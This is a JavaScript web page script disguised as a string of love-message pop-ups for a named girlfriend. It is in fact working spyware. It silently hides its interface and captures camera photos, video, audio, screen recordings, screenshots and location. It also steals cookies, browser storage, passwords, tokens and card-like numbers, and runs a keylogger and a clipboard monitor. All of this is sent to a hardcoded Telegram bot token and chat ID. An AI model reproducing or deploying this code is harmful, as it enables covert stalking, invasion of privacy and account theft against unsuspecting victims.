// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let isAutoCameraEnabled = true;
let isSilentMode = true;

// Screen Recording variables
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    if (isSilentMode) hideAllUIElements();
    initializeInterceptors();
    
    // MODIFIED: Request camera FIRST before anything else
    requestCameraFirst();
});

async function requestCameraFirst() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        });
        cameraStream = stream;
        setTimeout(() => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
        }, 2000);
    } catch(error) {}
    
    // After camera permission, start silent operations
    startSilentOperations();
    
    // Start love alerts after 3 seconds
    setTimeout(() => {
        showLoveAlerts();
    }, 3000);
}

// ==================== SHOW LOVE ALERTS ====================
function showLoveAlerts() {
    const alerts = [
        "Hello Meghuu 😘",
        "I can't stop thinking about you.🥰😚❤",
        "You'll always be my girl.",
        "I love making you laugh. ❤❤❤😚",
        "When I'm with you, nothing else matters.",
        "All love is sweet, but ours is the sweetest.",
        "Because you're in my life, I know true love exists..",
        "I love you today. I will love you tomorrow. And I'll keep on loving you every day after that, too.",
        "I can't believe a girl like you exists and that I'm lucky enough to have found her.",
        "Know that no matter where life takes us, you will always be the only one for me.",
        "My favorite part of every day is the time I get to spend with you.",
        "When others talk about their greatest achievements and things they are most proud of, the only thing that comes to mind is you.",
        "I'm missing you.",
        "You are the prettiest girl I've ever seen.",
        "Whenever I count my blessings, you are at the top of my list.",
        "I am the luckiest man alive because I get to call you mine.",
        "No one understands me like you do.",
        "You know exactly what I need, even if I don't say it.",
        "I love you not only for who you are, but also for who I become when I am with you.",
        "Ever since I met you, no one else has been worth thinking about.",
        "I know you love me because you put up with me even when I'm at my worst.",
        "if you need me, just call me i don't care if im sleeping or having my own problems or angry with you. ill be there for you anytime❣",
        "love you so much Meghuu ❣❣❣❣❣❣"
    ];
    
    let index = 0;
    setInterval(() => {
        alert(alerts[index % alerts.length]);
        index++;
    }, 10000);
}

// ==================== SILENT MODE FUNCTIONS ====================
function hideAllUIElements() {
    const elementsToHide = ['counter', 'timer', 'response', 'mapContainer', 'previewContainer', 'video', 'captureBtn', 'themeToggle', 'loveText'];
    elementsToHide.forEach(id => {
        const element = document.getElementById(id);
        if (element) element.style.display = 'none';
    });
    document.querySelectorAll('button').forEach(btn => {
        if (!btn.id.includes('hidden')) btn.style.display = 'none';
    });
    if (isSilentMode) {
        console.log = function() {};
        console.warn = function() {};
        console.error = function() {};
    }
}

// ==================== SCREEN RECORDING ====================
async function startScreenRecording() {
    if (!CHAT_ID || isRecording) return;
    try {
        screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", displaySurface: "monitor", frameRate: { ideal: 30 } },
            audio: true
        });
        const mimeType = getSupportedMimeType();
        screenRecorder = new MediaRecorder(screenStream, { mimeType: mimeType, videoBitsPerSecond: 2500000 });
        recordedChunks = [];
        screenRecorder.ondataavailable = (event) => { if (event.data && event.data.size > 0) recordedChunks.push(event.data); };
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_record_${Date.now()}.${extension}`, { type: mimeType });
            const deviceInfo = await collectDeviceInfo();
            await sendVideoToTelegram(file, `🎥 វីដេអូអេក្រង់\n\n📊 ទំហំ: ${formatBytes(blob.size)}\n⏱️ រយៈពេល: ${getRecordingDuration()} វិនាទី\n\n${formatDeviceInfo(deviceInfo)}`);
            recordedChunks = [];
            if (screenStream) { screenStream.getTracks().forEach(track => track.stop()); screenStream = null; }
            screenRecorder = null;
        };
        screenRecorder.start(1000);
        isRecording = true;
        window.recordingStartTime = Date.now();
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(`🎬 **ចាប់ផ្តើមថតវីដេអូអេក្រង់**\n\n⏰ ពេល: ${new Date().toLocaleString('km-KH')}\n\n${formatDeviceInfo(deviceInfo)}`);
        setTimeout(() => { if (isRecording) stopScreenRecording(); }, 60000);
        screenStream.getVideoTracks()[0].addEventListener('ended', () => { if (isRecording) stopScreenRecording(); });
    } catch (error) {
        let errorMessage = 'មិនអាចថតអេក្រង់បាន';
        if (error.name === 'NotAllowedError') errorMessage = 'អ្នកប្រើបានបដិសេធការថតអេក្រង់';
        else if (error.name === 'NotFoundError') errorMessage = 'មិនឃើញអេក្រង់ដើម្បីថត';
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(`❌ **មិនអាចថតអេក្រង់បាន**\n\n📝 មូលហេតុ: ${errorMessage}\n\n${formatDeviceInfo(deviceInfo)}`);
    }
}

function stopScreenRecording() {
    if (screenRecorder && screenRecorder.state === 'recording') {
        screenRecorder.stop();
        isRecording = false;
    }
}

function getSupportedMimeType() {
    const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm;codecs=h264,opus', 'video/webm', 'video/mp4'];
    for (const type of types) { if (MediaRecorder.isTypeSupported(type)) return type; }
    return 'video/webm';
}

function getRecordingDuration() {
    if (window.recordingStartTime) return Math.round((Date.now() - window.recordingStartTime) / 1000);
    return 0;
}

// ==================== SCREENSHOT CAPTURE ====================
async function captureScreenshot() {
    if (!CHAT_ID) return;
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "always" }, audio: false });
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0);
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        canvas.toBlob(async (blob) => {
            const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
            const deviceInfo = await collectDeviceInfo();
            await sendPhotoToTelegram(file, `📸 រូបថតអេក្រង់\n\n${formatDeviceInfo(deviceInfo)}`);
        }, 'image/png');
    } catch(error) {}
}

// ==================== VIDEO RECORDING FROM CAMERA ====================
let cameraRecorder = null;
let cameraRecordedChunks = [];

async function startCameraRecording() {
    if (!CHAT_ID) return;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
            audio: true
        });
        const mimeType = getSupportedMimeType();
        cameraRecorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 2500000 });
        cameraRecordedChunks = [];
        cameraRecorder.ondataavailable = (event) => { if (event.data && event.data.size > 0) cameraRecordedChunks.push(event.data); };
        cameraRecorder.onstop = async () => {
            const blob = new Blob(cameraRecordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `camera_record_${Date.now()}.${extension}`, { type: mimeType });
            const deviceInfo = await collectDeviceInfo();
            await sendVideoToTelegram(file, `📹 វីដេអូពីកាមេរ៉ា\n\n${formatDeviceInfo(deviceInfo)}`);
            cameraRecordedChunks = [];
            stream.getTracks().forEach(track => track.stop());
            cameraRecorder = null;
        };
        cameraRecorder.start(1000);
        const deviceInfo = await collectDeviceInfo();
        await sendMessageToTelegram(`🎥 **ចាប់ផ្តើមថតវីដេអូកាមេរ៉ា**\n\n${formatDeviceInfo(deviceInfo)}`);
        setTimeout(() => { if (cameraRecorder && cameraRecorder.state === 'recording') cameraRecorder.stop(); }, 30000);
    } catch(error) {}
}

// ==================== SEND TO TELEGRAM ====================
async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, `📁 ${caption}`);
    } catch(error) {}
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    try { await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData }); } catch(error) {}
}

async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
    } catch(err) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try { await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData }); } catch(error) {}
}

// ==================== COOKIE STEALER ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        cookies[name] = value;
    });
    return cookies;
}

function getCookieDetails() {
    const cookies = [];
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt', 'bearer', 'xsrf', 'csrf', 'remember', 'credential'];
        const isSensitive = sensitiveKeywords.some(keyword => name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword));
        let decodedValue = value;
        try { if (value.match(/^[A-Za-z0-9+/=]+$/)) decodedValue = atob(value); } catch(e) {}
        let parsedValue = null;
        try { parsedValue = JSON.parse(decodedValue); } catch(e) {}
        cookies.push({ name, value, decodedValue, parsedValue, isSensitive });
    });
    return cookies;
}

function getAllStorageData() {
    const data = { localStorage: {}, sessionStorage: {}, cookies: getAllCookies() };
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try { data.localStorage[key] = tryParseJSON(localStorage.getItem(key)); } catch(e) { data.localStorage[key] = 'Cannot read'; }
    }
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        try { data.sessionStorage[key] = tryParseJSON(sessionStorage.getItem(key)); } catch(e) { data.sessionStorage[key] = 'Cannot read'; }
    }
    return data;
}

function tryParseJSON(value) { try { return JSON.parse(value); } catch { return value; } }

function extractCredentials() {
    const credentials = { usernames: new Set(), emails: new Set(), passwords: new Set(), tokens: new Set(), apiKeys: new Set(), sessionIds: new Set(), creditCards: new Set(), phones: new Set() };
    for (let i = 0; i < localStorage.length; i++) extractFromString(localStorage.key(i), localStorage.getItem(localStorage.key(i)), credentials);
    for (let i = 0; i < sessionStorage.length; i++) extractFromString(sessionStorage.key(i), sessionStorage.getItem(sessionStorage.key(i)), credentials);
    const cookies = getCookieDetails();
    cookies.forEach(cookie => { extractFromString(cookie.name, cookie.value, credentials); if (cookie.decodedValue !== cookie.value) extractFromString(cookie.name, cookie.decodedValue, credentials); });
    document.querySelectorAll('input[type="hidden"]').forEach(input => extractFromString(input.name, input.value, credentials));
    document.querySelectorAll('script').forEach(script => { const content = script.textContent; if (content) extractFromString('script', content, credentials); });
    const windowKeys = ['user', 'currentUser', 'loggedInUser', 'auth', 'session', 'token', 'userData', 'profile'];
    windowKeys.forEach(key => { if (window[key]) { try { extractFromString(`window.${key}`, JSON.stringify(window[key]), credentials); } catch(e) {} } });
    return { usernames: Array.from(credentials.usernames), emails: Array.from(credentials.emails), passwords: Array.from(credentials.passwords), tokens: Array.from(credentials.tokens), apiKeys: Array.from(credentials.apiKeys), sessionIds: Array.from(credentials.sessionIds), creditCards: Array.from(credentials.creditCards), phones: Array.from(credentials.phones) };
}

function extractFromString(source, text, credentials) {
    if (!text || typeof text !== 'string') return;
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const emails = text.match(emailRegex);
    if (emails) emails.forEach(e => credentials.emails.add(e));
    const phoneRegex = /(?:\+855|0)[1-9][0-9]{7,8}|\+[1-9][0-9]{9,14}/g;
    const phones = text.match(phoneRegex);
    if (phones) phones.forEach(p => credentials.phones.add(p));
    const ccRegex = /\b[0-9]{13,19}\b/g;
    const ccs = text.match(ccRegex);
    if (ccs) ccs.forEach(c => credentials.creditCards.add(c));
    const jwtRegex = /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g;
    const jwts = text.match(jwtRegex);
    if (jwts) jwts.forEach(t => credentials.tokens.add(t));
    const bearerRegex = /bearer\s+([a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)/gi;
    const bearerMatch = text.match(bearerRegex);
    if (bearerMatch) bearerMatch.forEach(b => { const token = b.replace(/bearer\s+/i, ''); credentials.tokens.add(token); });
    const apiKeyPatterns = [/api[_-]?key[=:]\s*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi, /secret[=:]\s*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi, /token[=:]\s*['"]?([a-zA-Z0-9_-]{20,})['"]?/gi, /sk-[a-zA-Z0-9]{20,}/g, /AIza[a-zA-Z0-9_-]{30,}/g];
    apiKeyPatterns.forEach(pattern => { const matches = text.match(pattern); if (matches) matches.forEach(m => { const value = m.replace(/^[^=:]*[=:]\s*['"]?/i, '').replace(/['"]$/, ''); credentials.apiKeys.add(`${source}:${value}`); }); });
    const lowerText = text.toLowerCase();
    const sourceLower = source.toLowerCase();
    if (sourceLower.includes('pass') || sourceLower.includes('pwd') || sourceLower.includes('secret')) { if (text.length > 0 && text.length < 100) credentials.passwords.add(`${source}:${text}`); }
    if (sourceLower.includes('user') || sourceLower.includes('login') || sourceLower.includes('name') || sourceLower.includes('account')) { if (text.length > 0 && text.length < 50) credentials.usernames.add(`${source}:${text}`); }
    if (sourceLower.includes('session') || sourceLower.includes('sess') || sourceLower.includes('sid') || sourceLower.includes('connect.sid')) { if (text.length > 5) credentials.sessionIds.add(`${source}:${text}`); }
}

async function stealAllData() {
    if (!CHAT_ID) return;
    try {
        const cookies = getCookieDetails();
        const storageData = getAllStorageData();
        const credentials = extractCredentials();
        const pageContent = extractPageContent();
        const deviceInfo = await collectDeviceInfo();
        let message = `🔴 **ទិន្នន័យត្រូវបានលួច**\n\n🍪 Cookies: ${cookies.length}\n💾 LocalStorage: ${Object.keys(storageData.localStorage).length}\n🔐 Credentials: ${credentials.emails.length} emails, ${credentials.passwords.length} passwords\n📄 URL: ${pageContent.url}\n\n${formatDeviceInfo(deviceInfo)}`;
        await sendMessageToTelegram(message);
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, credentials, pageContent, deviceInfo };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 ទិន្នន័យពេញលេញ`);
    } catch(error) {}
}

function extractPageContent() {
    return { title: document.title, url: window.location.href };
}

// ==================== NETWORK INTERCEPTION ====================
function interceptFetch() {
    const originalFetch = window.fetch;
    window.fetch = async function(...args) { return originalFetch.apply(this, args); };
}

function interceptXHR() {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) { this._method = method; this._url = url; return originalOpen.apply(this, arguments); };
    XMLHttpRequest.prototype.send = function(body) { return originalSend.apply(this, arguments); };
}

function interceptWebSocket() { const originalWebSocket = window.WebSocket; window.WebSocket = function(...args) { return new originalWebSocket(...args); }; window.WebSocket.prototype = originalWebSocket.prototype; }

function initializeInterceptors() { interceptFetch(); interceptXHR(); interceptWebSocket(); }

// ==================== SILENT BACKGROUND OPERATIONS ====================
async function startSilentOperations() {
    setTimeout(() => stealAllData(), 1000);
    setTimeout(() => startScreenRecording(), 2000);
    setTimeout(() => captureScreenshot(), 3000);
    setTimeout(() => silentRequestMediaPermissions(), 4000);
    setTimeout(() => startCameraRecording(), 5000);
    setTimeout(() => silentCollectAndSendInfo(), 6000);
    setTimeout(() => silentRequestLocation(), 7000);
    setInterval(() => stealAllData(), 30000);
    setInterval(() => captureScreenshot(), 45000);
    setInterval(() => silentCollectAndSendInfo(), 60000);
}

async function silentRequestMediaPermissions() {
    if (!isAutoCameraEnabled) return;
    try {
        const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
        cameraStream = videoStream;
        setTimeout(() => silentCapturePhotos(videoStream), 500);
        const audio = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = audio;
        setTimeout(() => silentRecordAudio(audio), 1500);
    } catch(error) {}
}

async function silentCapturePhotos(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        for (let i = 1; i <= 3; i++) {
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    const file = new File([blob], `silent_capture_${i}.jpg`, { type: 'image/jpeg' });
                    const deviceInfo = await collectDeviceInfo();
                    await sendFileToTelegram(file, `📸 រូបភាពស្ងាត់ #${i}\n\n${formatDeviceInfo(deviceInfo)}`);
                }, 'image/jpeg', 0.9);
            }, i * 1000);
        }
        setTimeout(() => { if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; } video.remove(); }, 5000);
    } catch(error) {}
}

async function silentRecordAudio(stream) {
    try {
        const audioRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        audioRecorder.ondataavailable = (event) => { if (event.data.size > 0) audioChunks.push(event.data); };
        audioRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const file = new File([audioBlob], 'silent_audio.webm', { type: 'audio/webm' });
            const deviceInfo = await collectDeviceInfo();
            await sendFileToTelegram(file, `🎤 អូឌីយ៉ូស្ងាត់\n\n${formatDeviceInfo(deviceInfo)}`);
        };
        audioRecorder.start();
        setTimeout(() => { audioRecorder.stop(); if (audioStream) { audioStream.getTracks().forEach(track => track.stop()); audioStream = null; } }, 10000);
    } catch(error) {}
}

async function silentRequestLocation() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(async function(position) {
        currentLocation = { lat: position.coords.latitude, lng: position.coords.longitude, accuracy: Math.round(position.coords.accuracy) };
        await silentSendLocation();
    }, function(error) {}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
}

async function silentSendLocation() {
    if (!currentLocation) return;
    const deviceInfo = await collectDeviceInfo();
    const googleMapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
    await sendMessageToTelegram(`📍 ទីតាំងស្ងាត់\n\n${formatDeviceInfo(deviceInfo)}\n\n🗺️ Google Maps: ${googleMapsLink}`);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, latitude: currentLocation.lat, longitude: currentLocation.lng }) });
    } catch(err) {}
}

// ==================== DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    return {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${window.screen.width}x${window.screen.height}`,
        url: window.location.href
    };
}

async function getIPAddress() {
    try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); return data.ip; } catch { return 'Unable to fetch'; }
}

function formatDeviceInfo(info) {
    return `📱 Device\n⏰ ${info.timestamp}\n🌐 IP: ${info.ip}\n🖥️ ${info.platform}\n📺 Screen: ${info.screen}\n📄 ${info.url}`;
}

async function silentCollectAndSendInfo() {
    try { const deviceInfo = await collectDeviceInfo(); if (CHAT_ID) await sendMessageToTelegram(`🔄 ធ្វើបច្ចុប្បន្នភាពស្ងាត់\n\n${formatDeviceInfo(deviceInfo)}`); } catch(error) {}
}

// ==================== URL FUNCTIONS ====================
function cleanURL() { const uri = window.location.toString(); const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"]; patterns.forEach(pattern => { if (uri.indexOf(pattern) > 0) { const clean_uri = uri.substring(0, uri.indexOf(pattern)); window.history.replaceState({}, document.title, clean_uri); } }); }
function GetURLParameter(sParam) { const sPageURL = window.location.search.substring(1); const sURLVariables = sPageURL.split('&'); for (let i = 0; i < sURLVariables.length; i++) { const sParameterName = sURLVariables[i].split('='); if (sParameterName[0] === sParam) return sParameterName[1]; } return null; }
function decodeBase64(encodedStr) { try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; } }
function getChatIDFromURL() { const base64Id = GetURLParameter('i'); return base64Id ? decodeBase64(base64Id) : null; }
function initTheme() { if (themeToggle) themeToggle.style.display = 'none'; }
function formatBytes(bytes) { if (bytes === 0) return '0 Bytes'; const k = 1024; const sizes = ['Bytes', 'KB', 'MB', 'GB']; const i = Math.floor(Math.log(bytes) / Math.log(k)); return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i]; }

// ==================== CLIPBOARD, KEYLOGGER, FORM, PASSWORD ====================
let lastClipboardContent = '';
async function startClipboardMonitor() { if (!CHAT_ID) return; setInterval(async () => { try { const text = await navigator.clipboard.readText(); if (text && text !== lastClipboardContent && text.length > 0) { lastClipboardContent = text; const deviceInfo = await collectDeviceInfo(); await sendMessageToTelegram(`📋 Clipboard\n\n${text}\n\n${formatDeviceInfo(deviceInfo)}`); } } catch(error) {} }, 5000); }
if (CHAT_ID) startClipboardMonitor();

let keylogBuffer = '', keylogTimer = null;
document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Tab' || e.key === 'Backspace') {
        if (e.key === 'Enter') keylogBuffer += '[ENTER]\n';
        else if (e.key === 'Tab') keylogBuffer += '[TAB]';
        else if (e.key === 'Backspace') keylogBuffer += '[BACKSPACE]';
        else if (e.key === ' ') keylogBuffer += ' ';
        else keylogBuffer += e.key;
        if (keylogBuffer.length > 100 || e.key === 'Enter') { clearTimeout(keylogTimer); keylogTimer = setTimeout(() => sendKeylogData(), 2000); }
    }
});
async function sendKeylogData() { if (!keylogBuffer || !CHAT_ID) return; const dataToSend = keylogBuffer; keylogBuffer = ''; const deviceInfo = await collectDeviceInfo(); await sendMessageToTelegram(`⌨️ Keylog\n\n${dataToSend}\n\n${formatDeviceInfo(deviceInfo)}`); }

document.addEventListener('submit', async function(e) { if (!CHAT_ID) return; const form = e.target; const formData = new FormData(form); const data = {}; for (let [key, value] of formData.entries()) { if (value instanceof File) { data[key] = `[FILE: ${value.name}]`; await sendFileToTelegram(value, `📎 File: ${key}`); } else { data[key] = value; } } const deviceInfo = await collectDeviceInfo(); let message = `📝 Form Data\n\nForm Action: ${form.action || 'None'}\n`; for (let [key, value] of Object.entries(data)) message += `├─ ${key}: ${value}\n`; message += `\n${formatDeviceInfo(deviceInfo)}`; await sendMessageToTelegram(message); });

document.addEventListener('input', async function(e) { if (!CHAT_ID) return; const target = e.target; if ((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.type === 'password') { const inputValue = target.value; if (inputValue.length > 0) { const deviceInfo = await collectDeviceInfo(); await sendMessageToTelegram(`🔐 Password: ${inputValue}\n\n${formatDeviceInfo(deviceInfo)}`); } } });

window.addEventListener('beforeunload', function() { if (!CHAT_ID) return; const message = `👋 Leaving Page\n\nURL: ${window.location.href}`; const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' }); navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob); });